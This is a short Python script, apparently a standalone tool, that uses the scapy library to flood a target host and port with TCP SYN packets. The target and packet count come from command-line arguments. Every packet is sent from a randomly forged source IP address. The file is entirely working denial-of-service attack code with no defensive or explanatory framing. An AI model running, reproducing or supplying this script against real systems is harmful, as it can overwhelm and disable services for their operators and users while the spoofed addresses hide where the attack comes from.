import sys
from scapy.all import *
from random import randint

if __name__ == "__main__":
	# Store arguments in variables
	dest_addr = str(sys.argv[1])
	dest_port = int(sys.argv[2])
	nr_connect = int(sys.argv[3])

	for _ in range(nr_connect):
		src_ip = ".".join(str(random.randint(0,255)) for _ in range(4))
		seq = randint(1024, 9000)
		ip = IP(src=src_ip, dst=dest_addr)
		tcp = TCP(sport=RandShort(), dport=dest_port, seq=seq, flags="S")
		pkt = ip/tcp
		send(pkt, verbose=0)
